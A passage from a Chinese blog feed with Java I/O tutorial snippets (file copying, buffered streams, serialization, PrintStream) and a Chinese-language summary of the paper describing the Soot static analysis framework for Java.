<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Copy</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 1.创建流对象</span></span><br><span class="line"><span class="comment">// 1.1 指定数据源</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"D:\\test.jpg"</span>);</span><br><span class="line"><span class="comment">// 1.2 指定目的地</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"test_copy.jpg"</span>);</span><br><span class="line"><span class="comment">// 2.读写数据</span></span><br><span class="line"><span class="comment">// 2.1 定义数组</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">// 2.2 定义长度</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="comment">// 2.3 循环读取</span></span><br><span class="line"><span class="keyword">while</span> ((len = fis.read(b))!=‐<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 2.4 写出数据</span></span><br><span class="line">fos.write(b, <span class="number">0</span> , len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3.关闭资源</span></span><br><span class="line">fos.close();</span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h1><p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429214541228.png" alt="image-20200429214541228"></p>
<h2 id="字节缓冲流-BufferedInputStream-OutputStream"><a href="#字节缓冲流-BufferedInputStream-OutputStream" class="headerlink" title="字节缓冲流 BufferedInputStream/OutputStream"></a>字节缓冲流 BufferedInputStream/OutputStream</h2><p>构造方法</p>
<p><code>public BufferedInputStream(InputStream in)</code> ：创建一个 新的缓冲输入流。 <code>public BufferedOutputStream(OutputStream out)</code> ： 创建一个新的缓冲输出流。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建字节缓冲输入流</span></span><br><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"bis.txt"</span>));</span><br><span class="line"><span class="comment">// 创建字节缓冲输出流</span></span><br><span class="line">BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"bos.txt"</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferedDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line"><span class="keyword">try</span> (</span><br><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"jdk9.exe"</span>));</span><br><span class="line">BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"copy.exe"</span>));</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">// 读写数据</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>*<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> ((len = bis.read(bytes)) != ‐<span class="number">1</span>) &#123;</span><br><span class="line">bos.write(bytes, <span class="number">0</span> , len);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">"缓冲流使用数组复制时间:"</span>+(end ‐ start)+<span class="string">" 毫秒"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">缓冲流使用数组复制时间:<span class="number">666</span> 毫秒</span><br></pre></td></tr></table></figure>

<p>特有方法：</p>
<p>字符缓冲流的基本方法与普通字符流调用方式一致，不再阐述，我们来看它们具备的特有方法。 </p>
<p><code>BufferedReader</code>： <code>public String readLine()</code> : 读一行文字。 <code>BufferedWriter</code>： <code>public void newLine()</code> : 写一行行分隔符,由系统属性定义符号。</p>
<p>readLine 方法演示，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferedReaderDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 创建流对象</span></span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"in.txt"</span>));</span><br><span class="line"><span class="comment">// 定义字符串,保存读取的一行文字</span></span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// 循环读取,读取到最后返回null</span></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine())!=<span class="keyword">null</span>) &#123;</span><br><span class="line">System.out.print(line);</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">br.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileOutputStream fileOut = <span class="keyword">new</span> FileOutputStream(<span class="string">"employee.txt"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> </span>&#123;</span><br><span class="line">Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">e.name = <span class="string">"zhangsan"</span>;</span><br><span class="line">e.address = <span class="string">"beiqinglu"</span>;</span><br><span class="line">e.age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建序列化流对象</span></span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"employee.txt"</span>));</span><br><span class="line"><span class="comment">// 写出对象</span></span><br><span class="line">out.writeObject(e);</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">out.close();</span><br><span class="line">fileOut.close();</span><br><span class="line">System.out.println(<span class="string">"Serialized data is saved"</span>); <span class="comment">// 姓名，地址被序列化，年龄没有被序列</span></span><br><span class="line">化。</span><br><span class="line">&#125; <span class="keyword">catch</span>(IOException i) &#123;</span><br><span class="line">i.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">Serialized data is saved</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建反序列化流</span></span><br><span class="line">FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"employee.txt"</span>);</span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line"><span class="comment">// 读取一个对象</span></span><br><span class="line">e = (Employee) in.readObject();</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">in.close();</span><br><span class="line">fileIn.close();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 调用系统的打印流,控制台直接输出97</span></span><br><span class="line">System.out.println(<span class="number">97</span>);</span><br><span class="line"><span class="comment">// 创建打印流,指定文件的名称</span></span><br><span class="line">PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">"ps.txt"</span>);</span><br><span class="line"><span class="comment">// 设置系统的打印流流向,输出到ps.txt</span></span><br><span class="line">System.setOut(ps);</span><br><span class="line"><span class="comment">// 调用系统的打印流,ps.txt中输出97</span></span><br><span class="line">System.out.println(<span class="number">97</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>一个Java对象的内存图</title>
    <url>/%E4%B8%80%E4%B8%AAJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%86%85%E5%AD%98%E5%9B%BE/</url>
    <content><![CDATA[<p><img src="../images/%E4%B8%80%E4%B8%AAJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%86%85%E5%AD%98%E5%9B%BE/image-20200427210136800.png" alt="image-20200427210136800"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Soot</title>
    <url>/Soot/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>跬步而不休，跛鳖千里。</p>
</blockquote>
<p>今天来学习Soot，主要来膜拜这篇神文。</p>
<p><a href="http://sable.github.io/soot/resources/lblh11soot.pdf" target="_blank" rel="noopener">http://sable.github.io/soot/resources/lblh11soot.pdf</a></p>
<a id="more"></a>

<h1 id="I-INTRODUCTION"><a href="#I-INTRODUCTION" class="headerlink" title="I. INTRODUCTION"></a>I. INTRODUCTION</h1><p><a href="https://github.com/Sable/soot" target="_blank" rel="noopener">Soot</a>是一款针对Java语言进行静态分析的框架，诞生于2000年。</p>
<p>它允许研究人员在它的基础上开发静态分析工具。</p>
<p>针对它的核心来说，它是一款编译器。</p>
<p>它接收JVM字节码文件或者Java源码，并且主要返回Java字节码。</p>
<p>Soot的主要特点：</p>
<ol>
<li>简化JVM的字节码文件，转换为三地址码的中间表示形式；</li>
<li>大量的指针分析；</li>
<li>调用图构造算法API；</li>
<li>可以生成可执行的JVM字节码文件；</li>
</ol>
<h1 id="Ⅱ-FEATURES"><a href="#Ⅱ-FEATURES" class="headerlink" title="Ⅱ. FEATURES"></a>Ⅱ. FEATURES</h1><p>##程序内特征 intraprocedual</p>
<p>Soot的基本中间代码表示形式是Jimple，Jimple就是一种三地址代码。</p>
<p>Jimple诞生的初衷是由于：</p>
<p>直接分析字节码是很困难的。</p>
<p>尽管可以为Java字节码构造控制流图，但是往往隐式的堆栈活动会掩盖住数据流。</p>
<p>并且对于一个给定的字节码指令s来说，基于堆栈的s的输入往往并不是在变址处产生的。</p>
<p>所以soot的作者发现，<strong>将数据存储在指定的局部变量中，而不是隐式堆栈中，可以使得数据的局部流(沿着Jimple的控制流图)更加明显。</strong></p>
<p>Jimple内的本地变量会根据（定义-使用链）(<em>define-use chains</em>)进行分类。</p>
<p>Soot内部还有其他中间表示形式：</p>
<ul>
<li><p><strong>Shimple</strong>是基于SSA版本的Jimple；</p>
</li>
<li><p><strong>Baf</strong>和<strong>Grimple</strong>是用来生成字节码的；</p>
</li>
<li><p><strong>Dava</strong>是一个抽象的基于语法树的中间表示，它是由jimple IR反编译生成的。</p>
</li>
</ul>
<p>Java字节码包含了原始源代码的类和方法结构等许多信息，所以在Soot的分析过程中，Soot可以自由地利用类和方法名信息。</p>
<p>Soot还可以为它所分析的方法提供行号和变量名信息。</p>
<p><img src="../images/Soot/image-20200424175153089.png" alt="image-20200424175153089"></p>
<p>Soot最强大的一点是用户可以通过指定抽象类和实现该抽象的函数来创建数据流分析。</p>
<p>Soot还为常见的抽象类提供了适配的数据结构实现。</p>
<h2 id="过程间分析-interprocedural"><a href="#过程间分析-interprocedural" class="headerlink" title="过程间分析 interprocedural"></a>过程间分析 interprocedural</h2><p>复杂的静态分析需要调用图和指针信息，这从根本上讲是一个过程间的问题。 </p>
<p>Soot包括Spark指针分析工具包，并且还支持基于BDD的PADDLE指针分析框架，该框架增加了上下文相关性。</p>
<h3 id="调用图-Call-Graph"><a href="#调用图-Call-Graph" class="headerlink" title="调用图 Call Graph"></a>调用图 Call Graph</h3><p>Soot框架提供了调用图信息。对于每个调用点（call site），静态分析（尤其是过程间分析）需要知道该调用点的所有可能调用目标。</p>
<p> Java的面向对象性质使此问题复杂化，因为被调用者（或目标）的身份取决于虚拟调用的接收者对象的<strong>运行时类型</strong>，而Java程序中的大多数调用都是虚拟调用。</p>
<p>Spark的调用图构造算法会计算出运行时可能发生的一组调用的近似值。调用图边连接源（表示为（方法，语句）对）和目标（始终是方法中的第一个语句）。</p>
<p><em>Over-approximation</em>意味着在程序的任何执行中可能发生的任何调用都必须出现在调用图中。</p>
<p>Spark实现了许多不同的调用图构造方法，包括类层次分析和快速类型分析。</p>
<p>但是，我们发现最有效的调用图构造方法是按需进行的，并在计算点对集的同时构建调用图，从CHA调用图作为可到达组的初始近似值的开始方法。</p>
<p>可以通过查询call site生成调用图； 通过调用方法； 或“向后”（按目标方法）。</p>
<p>出于效率考虑，Spark返回迭代器作为调用图查询的结果。 Spark还为客户提供了任何方法或语句的可传递目标集。 最后，Spark还公开了程序的可访问方法集-从程序的入口点可传递地访问的方法集（除程序的main（）方法外，还包括类初始化等）。</p>
<h3 id="指针分析-Pointer-Analyses"><a href="#指针分析-Pointer-Analyses" class="headerlink" title="指针分析 Pointer Analyses"></a>指针分析 Pointer Analyses</h3><p>许多静态分析需要指针信息：</p>
<p>它们需要知道两个变量p和q在运行时是否可以引用同一堆对象。 </p>
<p>Spark实现了上下文无关的基于子集的指向分析（Andersenstyle）。</p>
<p>分析可以查询要点分析，并获得由PointToSet表示的局部变量或对象字段所指向的对象的抽象。 </p>
<p>PointsToSet支持两个查询：</p>
<ol>
<li>集合中对象的可能类型集合；</li>
<li>两个PointsToSet对象是否具有非空交集。 可能的类型将有关方法调用的可能接收者的信息提供给变量，该变量的值指向设置的模型。 如果变量p和q具有非空交点的指向集，则它们可能指向同一对象。</li>
</ol>
<h3 id="副作用分析-Side-Effects"><a href="#副作用分析-Side-Effects" class="headerlink" title="副作用分析 Side Effects"></a>副作用分析 Side Effects</h3><p>副作用分析建立在（任何基于Soot的）指向和调用图分析之上。</p>
<p>副作用分析可以确定语句s是否可能依赖于语句s’。 它通过为每个语句定义读写集，然后比较它们的交集来工作。 </p>
<p>两个具有不相交的读写集的语句是独立的，而先写一个值的语句后跟另一个读相同值的语句遵循一个依赖关系。</p>
<h3 id="Spark的替代和扩展"><a href="#Spark的替代和扩展" class="headerlink" title="Spark的替代和扩展"></a>Spark的替代和扩展</h3><p>尽管Spark是Soot的基本调用图和指针分析生成器，但它不是唯一的选择。 </p>
<p> PADDLE 提供了基于BDD的上下文敏感指针分析； 但是，它在构建时和在运行时都需要额外的依赖关系。</p>
<p>到目前为止，虽然我们已经描述了指针分析都是可能别名分析<em>may-alias</em>，但Soot还包含了过程内必需别名分析must-alias。 </p>
<p>对象代表将此必须别名分析与过程内和整个程序的可能别名分析相集成； Spark是整个程序可能别名分析的来源之一。</p>
<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>许多Java程序都使用反射来按名称访问类或其成员。 </p>
<p>这种反映性访问很难静态分析：</p>
<p>类和方法名称可以在运行时计算，也可以从静态分析无法访问的文件中加载。</p>
<p> 一种解决方法是在运行时记录有关反射用法的信息（需要训练），并在执行调用图和指向分析时使用此信息。</p>
<h2 id="Soot输出"><a href="#Soot输出" class="headerlink" title="Soot输出"></a>Soot输出</h2><p>Soot支持使分析结果可用的多种机制。</p>
<p>开发人员的选择包括：</p>
<p>1）输出转换后的类文件； </p>
<p>2）输出错误信息；</p>
<p> 3）生成包含分析结果的HTML或图形；</p>
<p>4）创建（潜在转换的）类文件，并从程序分析中获得结果。</p>
<p>一个使用Soot变换类文件的工具示例是DUSC工具。</p>
<p>该工具通过首先对应用程序执行保留语义的转换以实现动态更新，然后为应用程序的新版本创建Java类，从而可以在运行时进行交换，从而实现Java程序的动态软件更新。</p>
<p>Soot还可以实现不保留语义的转换。</p>
<p> Tkachuk和Dwyer使用Soot生成了系统环境行为的不可执行的摘要，从而简化了系统的后续模型检查。生成的环境摘要包括实际环境的所有可能影响，并使用Java字节码表示，并用特殊的建模原语（使用方法调用编写）扩充了这些摘要。</p>
<h1 id="III-WORKING-WITH-AND-EXTENDING-SOOT"><a href="#III-WORKING-WITH-AND-EXTENDING-SOOT" class="headerlink" title="III. WORKING WITH AND EXTENDING SOOT"></a>III. WORKING WITH AND EXTENDING SOOT</h1><h2 id="运行Soot"><a href="#运行Soot" class="headerlink" title="运行Soot"></a>运行Soot</h2><p>在命令行上运行Soot是与Soot交互的最简单方法。 </p>
<p>Jimple代码作为Java字节码的清理版本对人类很有用。实际上，我们专门为此目的创建了Jimple的Jimp方言。它牺牲了可读性的完整性，例如通过省略字段的全名。完整的Jimple可以重新编译为Java字节码，而Jimp对于手动检查最有用。</p>
<p>Soot也可以优化字节码。但是，现代Java虚拟机和实时编译器在优化代码方面做得非常出色（使用仅在运行时可用的信息），因此Soot的优化不会提高常规字节码的性能。该优化对于非标准字节码（例如abc AspectJ编译器生成的字节码）很有用。</p>
<p>运行Soot的另一种方法是通过其Eclipse插件。 Eclipse插件允许用户调用Soot（或其增强版本）。但是，更重要的是，它还允许用户查看Jimple CFG和静态分析结果。特别是，Soot Eclipse插件使开发人员可以在计算时查看流量分析结果。另外，该插件可以显示汇总分析结果的属性。</p>
<h2 id="Building-on-soot"><a href="#Building-on-soot" class="headerlink" title="Building on soot"></a>Building on soot</h2><p>要使用Soot进行程序分析研究，用户必须编写扩展Soot功能的编译器遍历。</p>
<p>Soot提供两种基本的通行证类型：BodyTransformers和SceneTransformers。 </p>
<p><strong>BodyTransformer</strong>最适合进行过程内分析，并在程序中的每种方法上执行。 </p>
<p><strong>SceneTransformer</strong>仅执行一次，并且可能会分析并处理整个程序。</p>
<p>这些Transformer属于Packs，它们对应于编译器遍历的集合。我们已经记录了Soot开箱即用的套件包，研究人员可以自由地将其添加到所提供的套件（如果它在适当的阶段运行），或者创建自己的套件。</p>
<p>不同的Transformer可以通过共享包含分析结果的Map或使用属性进行通信。</p>
<p>我们明确选择禁止在IR语句上存储信息（例如，通过对Jimple Stmts进行子类化）来进行分析，因为这很难进行不同的分析。</p>
<p>我们建议用户通过创建自己的自定义主类来向Soot添加通行证，该类通过添加适当的Transformer来操纵Soot的Pack，然后调用Soot main（）方法。</p>
<p> Soot的Eclipse插件可用于生成此用例的模板（文件→新建→示例）。也可以手动调用Soot的main（）方法在自己的代码中调用的不同方法。尽管这是使用Soot的更灵活的方法，但我们不建议大多数用户使用它。</p>
<h1 id="IV-SOOT-DEVELOPMENT-PROCESS-AND-COMMUNITY"><a href="#IV-SOOT-DEVELOPMENT-PROCESS-AND-COMMUNITY" class="headerlink" title="IV. SOOT DEVELOPMENT PROCESS AND COMMUNITY"></a>IV. SOOT DEVELOPMENT PROCESS AND COMMUNITY</h1><p>Soot最初是由Raja Vall´ee-Rai提出的理学硕士论文。</p>
<p>最初的开发发生在对Java进行分析的最初兴趣激增期间。</p>
<p>这种情况发生在1999–2000年，并最终发布了可行的过程内Java分析框架Soot 1.0。 </p>
<p>Soot确实可以从这些程序的字节码（而不是源代码）开始对Java程序进行复杂的分析。自最初发布以来，Soot已添加了许多功能。</p>
<p>Soot的核心开发围绕麦吉尔大学的Sable实验室进行。</p>
<p>Soot的主要维护者的角色已经在麦吉尔的许多学生和校友中轮换。</p>
<h2 id="A-Support-and-Community"><a href="#A-Support-and-Community" class="headerlink" title="A. Support and Community"></a>A. Support and Community</h2><p>有问题写邮件！</p>
<h2 id="B-Documentation"><a href="#B-Documentation" class="headerlink" title="B. Documentation"></a>B. Documentation</h2><p>文档的最基本形式是API设计。</p>
<p>第一作者回顾了与Raja进行的有关Soot API设计的广泛讨论。</p>
<p>我们认为核心内部Soot API具有合理的自我文档编制和易用性。 Soot还提供了一些Javadoc文档注释来阐明API，但是提供完整的Javadoc覆盖范围非常繁琐。除非以某种方式众包此类文档，否则期望研究编译器框架附带完整的Javadoc文档注释是不合理的。</p>
<p>我们相信，我们已经为研究编译器提供了人们所希望的最好的东西：良好的API设计以及偶尔的Javadoc注释。</p>
<p>Soot团队还创建了一组文档，解释了如何使用Soot执行各种任务。这些文档将引导读者完成诸如执行数据流分析和向Java类文件添加属性的任务。</p>
<p><a href="https://www.brics.dk/SootGuide/sootsurvivorsguide.pdf" target="_blank" rel="noopener">soot-survivor-guide</a></p>
<p><a href="https://github.com/Sable/soot/wiki/Tutorials" target="_blank" rel="noopener">soot-wiki</a></p>
<p>我们要指出的一种Soot帮助形式是错误消息。</p>
<p>两个常见的触发点是OutOfMemoryError和incomplete-classpath错误。</p>
<p>发生内存不足错误是因为Java虚拟机的默认内存分配不足以运行整个程序指针分析。因此，Soot会捕获此错误并显示一条错误消息，告诉用户如何增加内存分配。由于Soot需要程序的所有库来进行指针分析，因此会出现不完整类路径错误。当无法找到所需的类时，建议用户包括jce.jar和jsse.jar文件，它们很可能会丢失。</p>
<h1 id="V-SOOT-’-S-PAST-EVOLUTION-FUTURE-WORK-ON-SOOT"><a href="#V-SOOT-’-S-PAST-EVOLUTION-FUTURE-WORK-ON-SOOT" class="headerlink" title="V. SOOT ’ S PAST EVOLUTION + FUTURE WORK ON SOOT"></a>V. SOOT ’ S PAST EVOLUTION + FUTURE WORK ON SOOT</h1><h2 id="Singletons-and-multiple-Soot-runs"><a href="#Singletons-and-multiple-Soot-runs" class="headerlink" title="Singletons and multiple Soot runs"></a>Singletons and multiple Soot runs</h2><p>Soot的最初设计在许多地方都使用了Singleton单例设计模式。 对于希望从自己的客户端代码多次调用Soot的用户而言，这是非常不便的。 我们重构了Soot以消除大多数单例和全局变量，将剩余的全局变量合并为G单例，并实施了静态分析以检测不在G中的单例和全局变量。我们还添加了G.reset（）方法，重置Soot的状态。</p>
<h2 id="Partial-programs"><a href="#Partial-programs" class="headerlink" title="Partial programs"></a>Partial programs</h2><p>Soot要求为整个程序分析（例如指针分析）计算sound结果。 但是，许多应用程序（尤其是基于Eclipse的软件工程应用程序）没有或不需要整个程序。</p>
<p>最近，我们还修复了Soot在不使用所有引用库的情况下对Java字节码进行分析的支持。</p>
<h2 id="Java-front-end-parsers"><a href="#Java-front-end-parsers" class="headerlink" title="Java front-end parsers"></a>Java front-end parsers</h2><p>Soot最初不包括Java前端解析器。 幸运的是，这个问题引起了很多关注，并且Soot获得了基于Polyglot的Java前端，以及后来的Java 1.5兼容JastAddbased前端。</p>
<h2 id="Increased-efﬁciency"><a href="#Increased-efﬁciency" class="headerlink" title="Increased efﬁciency"></a>Increased efﬁciency</h2><p>在需求驱动的基础上，我们提高了Soot选定零件的性能。 我们注意到，不可能从一开始就预测应该对哪些零件进行优化。 改进了类层次结构，紧密连接的组件，局部类型推断和局部def / uses计算器的应用，从而使Soot受益匪浅。</p>
<h2 id="A-Future-Directions-for-Soot"><a href="#A-Future-Directions-for-Soot" class="headerlink" title="A. Future Directions for Soot"></a>A. Future Directions for Soot</h2><p>我们确定了Soot未来改进的三个方向：更快的启动和计算时间；过程间分析支持；并支持Java语言扩展。</p>
<p>任何使用整个程序分析结果的分析都必须等待Soot解析成千上万的类文件。问题在于，即使最小的Java程序也包含对Java类库的依赖关系，该依赖关系在库类之间具有广泛的交叉引用。结果是，一旦分析需要指针分析结果，Soot的运行时间就会从不到10秒增加到超过一分钟。我们认为，也许可以使用Gligoric等人的技术一劳永逸地序列化Java类库生成的Jimple代码。这将为Soot分析提供更快的启动时间。从改写Jimple创建代码和使用多个线程创建Jimple代码（还自2000年起就是一个不错的项目）开始，也可以提高性能。</p>
<p>尽管Soot对过程内分析提供了出色的支持，但过程间分析的开发人员却更多地留给了他们自己的设备。如上所述，Soot为新颖的过程间分析的作者提供了SceneTransformer。不幸的是，对于这样的作者，SceneTransformer在构造分析时没有提供任何帮助。特别是，一个Soot用户需要弄清楚如何遍历被分析程序的类，以及如何组合来自不同方法的分析结果。定义常见情况并使其易于编程的一些设计工作可能会帮助很多分析作者。</p>
<p>最后，从历史上看，使用Soot评估语言扩展（例如类型系统扩展）是困难的。尽管Soot对字节码进行了广泛的类型推断，但要在Soot的IR中获取源代码注释（例如类型注释）并不容易。现在，使用JastAdd前端可以更轻松地进行此类研究。但是，我们不知道有任何项目研究Java语言扩展，因此Soot会分析以扩展Java源语言给出的程序。</p>
<h1 id="VI-REFLECTIONS-ON-SOOT"><a href="#VI-REFLECTIONS-ON-SOOT" class="headerlink" title="VI. REFLECTIONS ON SOOT"></a>VI. REFLECTIONS ON SOOT</h1><p>在本节中，我们将介绍在开发Soot方面遇到的困难，为将来的编译器框架提出所需的功能，并以对Soot成功的原因的一些结论作为结论。</p>
<p>我们的经验是，从总体上讲，Soot现在可以完成我们认为会做的事情。 Soot的一个意外应用是用于不完整和不完整的程序分析。 当我们最初设计Soot时，这种分析在研究界是未知的。 然而，在随后的12年中，它们已经变得非常流行。Soot可以毫无问题地进行这种分析。</p>
<h2 id="Difﬁculties"><a href="#Difﬁculties" class="headerlink" title="Difﬁculties"></a>Difﬁculties</h2><p>我们想强调两个困难：在外部更改存在的情况下保持Soot的最新状态，并鼓励Soot用户做出自己的更改。</p>
<p>自Soot最初发布以来，Java语言已经发生了重大变化。 Java 1.3是2000年Soot 1.0发行时的Java的最新版本，它不包括泛型，invokedynamic，注释或foreach循环以及其他更改。幸运的是，对虚拟机的更改受到了更大的限制。但是，对于Soot团队来说，要跟上Java虚拟机（用于字节码输入）的变化，尤其是Java语言（对于Java前端）的变化，是很难的。对于Soot Eclipse插件，对Eclipse的更改也已成为（更为严重的）问题。</p>
<p>尽管我们在本文中着重介绍了许多贡献性的变化，但我们希望合并来自非McGill用户的更多Soot贡献。鉴于其他人已经开发出了普遍关注的Soot扩展，这一点尤其正确。</p>
<h2 id="Ways-to-Improve"><a href="#Ways-to-Improve" class="headerlink" title="Ways to Improve"></a>Ways to Improve</h2><p>我们已经在第五节中讨论了特定于Soot的潜在改进。在本节中，我们讨论了改进编译器框架的想法，我们认为这对更广泛的社区感兴趣。</p>
<p>我们认为，有许多原因导致Soot扩展无法重新合并到主要的Soot代码中。首先，应该设计编译器框架，以使其更容易独立发布框架扩展。尽管Eclipse插件系统对于研究编译器可能不必要地复杂，但是拥有一个简单的扩展系统可能仍然有用。由于我们当时还没有想到这个问题，因此在该领域Soot可能会得到很大改善。其次，发布软件既费时又无益。在评估论文时，会议应更加重视软件和数据发布；它们是科学过程中不可或缺的一部分。一些会议，例如ESEC / FSE，开始鼓励与论文一起发布更完整的信息，我们对此趋势表示赞赏。</p>
<p>我们还注意到很难发布框架文件。没有真正的参考文献将Soot描述为系统。我们鼓励会议接受更多的框架文件。</p>
<p>从更高的技术水平来看，Soot在两次通过之间重新计算了很多数据。它必须重新计算数据，因为它不知道有多少数据因中间计算而无效。增量或反应式计算将有助于提高编译器框架的性能。</p>
<h2 id="Reasons-for-Success"><a href="#Reasons-for-Success" class="headerlink" title="Reasons for Success"></a>Reasons for Success</h2><p>我们相信Soot之所以成功，是因为它在正确的时间提供了正确的功能并且易于使用。 我们在第二节中讨论了Soot的功能。 最重要的功能包括：1）Soot对Java的支持； 2）方便的Jimple中间表示； 和3）Spark指针分析工具包。 指针分析特别重要，因为对Java代码的大多数非平凡的分析必须合理地说明指针的行为。 任何编译器框架都将很难使用，但在有足够的决心的情况下，似乎Soot足够可用。 易用性还包括Soot的软件许可，每晚构建和准备偶尔发布的Soot版本（包含来自社区的补丁程序）以及Soot邮件列表中的响应能力。</p>
<h2 id="Acknowledgment"><a href="#Acknowledgment" class="headerlink" title="Acknowledgment"></a>Acknowledgment</h2><p>致谢。<br>Soot的开发得到了加拿大自然科学与工程研究委员会，魁北克自然与技术基金会，IBM高级研究中心以及Eclipse创新资助的部分支持。 Eric Bodden得到CASED（<a href="http://www.cased.de）的支持。" target="_blank" rel="noopener">www.cased.de）的支持。</a></p>
<p>我们要感谢为Soot的开发提供帮助的所有贡献者，并特别感谢Raja Vall´ee-Rai在Soot方面的开拓性工作。</p>
]]></content>
      <categories>
        <category>Papers</category>
      </categories>
      <tags>
        <tag>Soot</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM梳理</title>
    <url>/JVM%E6%A2%B3%E7%90%86/</url>
